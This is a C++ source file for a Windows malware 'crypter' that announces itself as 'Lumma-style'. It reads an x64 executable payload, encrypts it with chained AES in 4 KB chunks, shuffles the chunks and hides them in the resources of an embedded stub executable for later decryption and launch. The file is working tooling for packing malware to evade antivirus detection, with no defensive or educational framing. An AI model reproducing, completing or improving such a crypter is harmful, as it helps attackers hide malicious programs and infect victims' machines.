#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <algorithm>
#include <random>
#include <ctime>
#include <wincrypt.h>
#include "stub_bytes.h"
#pragma comment(lib, "advapi32.lib")
using namespace std;

// ============================================================================
// STRUCTURES
// ============================================================================
#pragma pack(push, 1)
struct PayloadIndex {
    uint32_t magic = 0xCAFEBABE;
    uint8_t  first_key;
    uint32_t total_size;
    uint16_t chunk_count;
    uint16_t first_chunk_id;
    uint32_t crc32;
    uint16_t shuffle_seed;  // NEW: Add this line
};
#pragma pack(pop)
// ============================================================================
// GLOBAL
// ============================================================================
char* fileBuffer = nullptr;

// ============================================================================
// CRC32
// ============================================================================
uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

// ============================================================================
// FIXED FILE WRITING WITH DEBUG
// ============================================================================
bool WriteStubToFile() {
    cout << "[*] Writing stub to Stub.exe..." << endl;
    
    // Check if stub data is valid
    if (!Stub_exe || Stub_exe_len == 0) {
        cerr << "[-] Stub_exe data is NULL or zero length!" << endl;
        return false;
    }
    
    // Check for MZ signature
    if (Stub_exe[0] != 'M' || Stub_exe[1] != 'Z') {
        cerr << "[-] Stub_exe doesn't have valid MZ signature!" << endl;
        return false;
    }
    
    ofstream f("Stub.exe", ios::binary);
    if (!f.is_open()) {
        cerr << "[-] Cannot create Stub.exe file!" << endl;
        return false;
    }
    
    f.write((char*)Stub_exe, Stub_exe_len);
    f.close();
    
    // Verify the file was written
    ifstream test("Stub.exe", ios::binary | ios::ate);
    if (!test.is_open()) {
        cerr << "[-] Failed to verify Stub.exe creation!" << endl;
        return false;
    }
    streamsize size = test.tellg();
    test.close();
    
    cout << "[+] Stub.exe created successfully (" << size << " bytes)" << endl;
    return (size == Stub_exe_len);
}

// ============================================================================
// WORKING AES ENCRYPTION FUNCTION - SIMPLIFIED AND FIXED
// ============================================================================
// ============================================================================
// SIMPLIFIED AES ENCRYPTION - NO FINAL FLAG COMPLEXITY
// ============================================================================
std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long size, uint8_t seed_key) {
    const int CHUNK_SIZE = 4096;
    int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    std::vector<std::vector<BYTE>> encrypted_chunks;
    
    cout << "[*] Encrypting " << size << " bytes into " << totalChunks << " chunks..." << endl;

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = seed_key ^ (i * 0x11);

    vector<BYTE> last_ciphertext(16, 0); // For CBC chaining

    for (int i = 0; i < totalChunks; i++) {
        int chunk_start = i * CHUNK_SIZE;
        int original_len = min(CHUNK_SIZE, (int)(size - chunk_start));

        cout << "[*] Processing chunk " << i << " (" << original_len << " bytes)..." << endl;

        // Prepare data with PKCS7 padding - EVERY CHUNK gets padded
        int padded_len = ((original_len + 15) / 16) * 16;
        vector<BYTE> chunk_data(padded_len);
        memcpy(chunk_data.data(), payload + chunk_start, original_len);
        
        BYTE pad_value = padded_len - original_len;
        for (int j = original_len; j < padded_len; j++) {
            chunk_data[j] = pad_value;
        }

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            cerr << "[-] CryptAcquireContext failed for chunk " << i << " - Error: " << GetLastError() << endl;
            continue;
        }

        // Prepare key blob
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyBlob = {0};

        keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        keyBlob.hdr.reserved = 0;
        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
        keyBlob.dwKeySize    = 32;
        memcpy(keyBlob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
            cerr << "[-] CryptImportKey failed for chunk " << i << " - Error: " << GetLastError() << endl;
            CryptReleaseContext(hProv, 0);
            continue;
        }

        // Set IV (zero for first chunk, last ciphertext block for others)
        if (i > 0 && !last_ciphertext.empty()) {
            if (!CryptSetKeyParam(hKey, KP_IV, last_ciphertext.data(), 0)) {
                cerr << "[-] CryptSetKeyParam (IV) failed for chunk " << i << " - Error: " << GetLastError() << endl;
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                continue;
            }
        }

        // SIMPLIFIED: Encrypt without final flag complexity
        DWORD encrypted_len = (DWORD)chunk_data.size();
        
        // CRITICAL FIX: Use FALSE for final flag on ALL chunks
        if (!CryptEncrypt(hKey, 0, FALSE, 0, chunk_data.data(), &encrypted_len, (DWORD)chunk_data.size())) {
            DWORD err = GetLastError();
            cerr << "[-] CryptEncrypt failed for chunk " << i << " - Error: " << err << endl;
            
            // Try with larger buffer
            if (err == ERROR_MORE_DATA) {
                DWORD needed_size = encrypted_len;
                chunk_data.resize(needed_size);
                encrypted_len = (DWORD)chunk_data.size();
                
                if (!CryptEncrypt(hKey, 0, FALSE, 0, chunk_data.data(), &encrypted_len, (DWORD)chunk_data.size())) {
                    cerr << "[-] CryptEncrypt failed after resize for chunk " << i << " - Error: " << GetLastError() << endl;
                    CryptDestroyKey(hKey);
                    CryptReleaseContext(hProv, 0);
                    continue;
                }
            } else {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                continue;
            }
        }

        // Resize to actual encrypted size
        chunk_data.resize(encrypted_len);

        // Store last ciphertext block for next chunk's IV
        if (encrypted_len >= 16) {
            last_ciphertext.assign(chunk_data.end() - 16, chunk_data.end());
        } else {
            last_ciphertext.assign(chunk_data.begin(), chunk_data.end());
            last_ciphertext.resize(16, 0);
        }

        encrypted_chunks.push_back(std::move(chunk_data));

        cout << "[+] Chunk " << i << " encrypted successfully (" << encrypted_len << " bytes)" << endl;

        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
    }

    if (encrypted_chunks.size() != totalChunks) {
        cerr << "[-] Encryption incomplete! Only " << encrypted_chunks.size() << " out of " << totalChunks << " chunks processed." << endl;
    } else {
        cout << "[+] All " << encrypted_chunks.size() << " chunks encrypted successfully!" << endl;
        
        // Debug: Show chunk sizes
        for (size_t i = 0; i < encrypted_chunks.size(); i++) {
            cout << "    Chunk " << i << ": " << encrypted_chunks[i].size() << " bytes" << endl;
        }
    }

    return encrypted_chunks;
}
// ============================================================================
// FIXED RESOURCE INJECTION WITH PROPER ERROR CHECKING
// ============================================================================
bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
    cout << "[*] Starting resource injection with shuffle..." << endl;
    
    // DEBUG: Check if Stub.exe exists and is valid
    DWORD attrib = GetFileAttributesA("Stub.exe");
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        cerr << "[-] Stub.exe doesn't exist! Error: " << GetLastError() << endl;
        return false;
    }
    
    // Check if file is in use
    HANDLE hTest = CreateFileA("Stub.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hTest == INVALID_HANDLE_VALUE) {
        cerr << "[-] Stub.exe is locked/in use! Error: " << GetLastError() << endl;
        return false;
    }
    CloseHandle(hTest);
    
    cout << "[+] Stub.exe is accessible, beginning resource update..." << endl;

    HANDLE hUpdate = BeginUpdateResourceA("Stub.exe", FALSE);
    if (!hUpdate) {
        DWORD err = GetLastError();
        cerr << "[-] BeginUpdateResourceA failed! Error: " << err << endl;
        if (err == ERROR_FILE_NOT_FOUND) cerr << "   - File doesn't exist" << endl;
        else if (err == ERROR_ACCESS_DENIED) cerr << "   - Access denied (file in use)" << endl;
        else if (err == ERROR_BAD_EXE_FORMAT) cerr << "   - Not a valid PE file" << endl;
        return false;
    }

    srand((unsigned)time(nullptr));
    uint16_t first_chunk_id = 300 + (rand() % 400);
    
    // NEW: Generate reproducible shuffle seed
    uint16_t shuffle_seed = (uint16_t)(GetTickCount() ^ rand());
    
    PayloadIndex index{};
    index.magic = 0xCAFEBABE;
    index.first_key = first_key;
    index.total_size = static_cast<uint32_t>(payloadSize);
    index.chunk_count = static_cast<uint16_t>(encrypted_chunks.size());
    index.first_chunk_id = first_chunk_id;
    index.crc32 = CalculateCRC32(fileBuffer, payloadSize);
    index.shuffle_seed = shuffle_seed;  // NEW: Store seed
    
    cout << "[*] Using shuffle seed: " << shuffle_seed << endl;
    cout << "[*] Injecting index (ID 999) with " << encrypted_chunks.size() << " chunks starting at ID " << first_chunk_id << endl;

    // Inject index
    if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(999),
                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                         &index, sizeof(index))) {
        DWORD err = GetLastError();
        cerr << "[-] Failed to inject index! Error: " << err << endl;
        EndUpdateResourceA(hUpdate, TRUE); // Discard changes
        return false;
    }
    cout << "[+] Index injected successfully" << endl;
    
    // NEW: Create shuffled order
    std::vector<size_t> chunk_order(encrypted_chunks.size());
    for (size_t i = 0; i < encrypted_chunks.size(); ++i) {
        chunk_order[i] = i;
    }
    
    // Shuffle using the seed (deterministic but random-looking)
    std::mt19937 rng(shuffle_seed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
    
    // Debug output of shuffle order
    cout << "[*] Shuffled chunk order (first 10): ";
    for (size_t i = 0; i < min((size_t)10, chunk_order.size()); ++i) {
        cout << chunk_order[i] << " ";
    }
    if (chunk_order.size() > 10) cout << "...";
    cout << endl;
    
    // Display mapping for debugging
    if (encrypted_chunks.size() <= 15) {
        cout << "[*] Resource ID mapping:" << endl;
        for (size_t i = 0; i < encrypted_chunks.size(); ++i) {
            cout << "    Resource ID " << (first_chunk_id + i) 
                 << " contains logical chunk " << chunk_order[i] << endl;
        }
    }

    // NEW: Inject chunks in shuffled order
    for (size_t resource_position = 0; resource_position < encrypted_chunks.size(); ++resource_position) {
        size_t logical_chunk_idx = chunk_order[resource_position];
        WORD resource_id = first_chunk_id + (WORD)resource_position;  // IDs stay sequential
        
        if (encrypted_chunks[logical_chunk_idx].empty()) {
            cerr << "[-] Logical chunk " << logical_chunk_idx << " is empty, skipping!" << endl;
            continue;
        }
        
        cout << "[+] Injecting logical chunk " << logical_chunk_idx 
             << " → Resource ID " << resource_id 
             << " (position " << resource_position << ")" << endl;
        
        if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(resource_id),
                             MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                             (LPVOID)encrypted_chunks[logical_chunk_idx].data(),
                             (DWORD)encrypted_chunks[logical_chunk_idx].size())) {
            DWORD err = GetLastError();
            cerr << "[-] Failed to inject chunk ID " << resource_id 
                 << " (logical chunk " << logical_chunk_idx << ")! Error: " << err << endl;
            EndUpdateResourceA(hUpdate, TRUE);
            return false;
        }
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        DWORD err = GetLastError();
        cerr << "[-] EndUpdateResource failed! Error: " << err << endl;
        return false;
    }

    cout << "\n[SUCCESS] All resources injected with shuffle!" << endl;
    cout << "          - Index at ID 999 with shuffle seed: " << shuffle_seed << endl;
    cout << "          - Chunks start at ID: " << first_chunk_id << endl;
    cout << "          - Total chunks: " << encrypted_chunks.size() << endl;
    cout << "          - Stub must use same seed to reconstruct order" << endl;
    
    return true;
}

// ============================================================================
// REST OF THE FUNCTIONS (same as before)
// ============================================================================
bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
    FILE* file = fopen(filename, "rb");
    if (!file) return false;
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    rewind(file);
    *buffer = (char*)malloc(*size);
    if (*buffer) fread(*buffer, 1, *size, file);
    fclose(file);
    return *buffer != nullptr;
}

bool ValidatePEArchitecture(char* buf) {
    auto dos = (IMAGE_DOS_HEADER*)buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nt = (IMAGE_NT_HEADERS64*)(buf + dos->e_lfanew);
    return nt->Signature == IMAGE_NT_SIGNATURE && nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
}

void Cleanup() {
    if (fileBuffer) free(fileBuffer);
    fileBuffer = nullptr;
}

int main(int argc, char* argv[]) {
    system("color 0a");
    cout << "\n  LUMMA-STYLE CHAINED CRYPTER — WORKING AES VERSION\n\n";

    if (argc < 2) {
        cout << "Usage: crypter.exe <payload.exe>\n";
        system("pause");
        return 1;
    }

    long size = 0;
    const BYTE KEY = 0x5B;

    cout << "[*] Reading payload file: " << argv[1] << endl;
    if (!ReadPayloadFile(argv[1], &fileBuffer, &size) || size == 0) {
        cerr << "[-] Failed to read payload file" << endl;
        system("pause");
        return 1;
    }
    cout << "[+] Payload read: " << size << " bytes" << endl;

    if (!ValidatePEArchitecture(fileBuffer)) {
        cerr << "[-] Not a valid x64 PE file" << endl;
        Cleanup();
        system("pause");
        return 1;
    }
    cout << "[+] Valid x64 PE confirmed" << endl;

    if (!WriteStubToFile()) {
        Cleanup();
        system("pause");
        return 1;
    }

    // Small delay to ensure file is fully written and released
    Sleep(100);

    cout << "[*] Starting encryption process..." << endl;
    auto chunks = EncryptPayloadChained(fileBuffer, size, KEY);

    if (chunks.empty()) {
        cerr << "[-] Encryption produced no chunks!" << endl;
        Cleanup();
        system("pause");
        return 1;
    }

    cout << "[*] Encryption completed, injecting resources..." << endl;
    if (!InjectWithSeparateIndex(chunks, size, KEY)) {
        Cleanup();
        system("pause");
        return 1;
    }

    Cleanup();
    cout << "\n[SUCCESS] Stub.exe created with AES encryption!\n";
    cout << "[NOTE] Make sure your stub uses the SAME AES decryption logic!\n";
    system("pause");
    return 0;
}